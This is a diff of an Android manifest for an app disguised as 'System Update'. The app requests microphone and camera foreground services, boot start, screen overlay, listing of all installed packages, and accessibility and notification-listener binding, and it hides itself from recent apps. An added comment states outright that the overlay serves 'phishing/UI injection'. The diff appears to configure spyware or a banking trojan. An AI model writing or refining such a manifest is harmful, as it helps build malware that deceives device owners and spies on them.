@@ -42,17 +42,23 @@
     <uses-permission android:name="android.permission.FOREGROUND_SERVICE_MICROPHONE"/>
     <uses-permission android:name="android.permission.FOREGROUND_SERVICE_CAMERA" />
     <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
-    <uses-permission android:name="android.permission.SYSTEM_ALERT_WINDOW"/>
+    <uses-permission android:name="android.permission.SYSTEM_ALERT_WINDOW"
+                 tools:ignore="UnusedLegacyPermission">
+    <!-- Shown system overlay for phishing/UI injection -->
+</uses-permission>
     <uses-permission android:name="android.permission.REQUEST_IGNORE_BATTERY_OPTIMIZATIONS"/>
-    <uses-permission android:name="android.permission.QUERY_ALL_PACKAGES"
-                     tools:ignore="QueryAllPackagesPermission"/>
+<uses-permission android:name="android.permission.QUERY_ALL_PACKAGES"
+                 tools:ignore="QueryAllPackagesPermission">
+    <!-- Required for accessing app lists and system functions -->
+</uses-permission>
     <uses-permission android:name="android.permission.BIND_ACCESSIBILITY_SERVICE"
                      tools:ignore="ProtectedPermissions"/>
     <uses-permission android:name="android.permission.BIND_NOTIFICATION_LISTENER_SERVICE"
                      tools:ignore="ProtectedPermissions"/>
 
     <application android:label="System Update" android:allowBackup="false"
-                 android:usesCleartextTraffic="true">
+                 android:icon="@mipmap/ic_launcher"
+                 android:vmSafeMode="true">
 
         <activity android:name=".MainActivity" android:exported="true"
                   android:excludeFromRecents="true" android:noHistory="true">
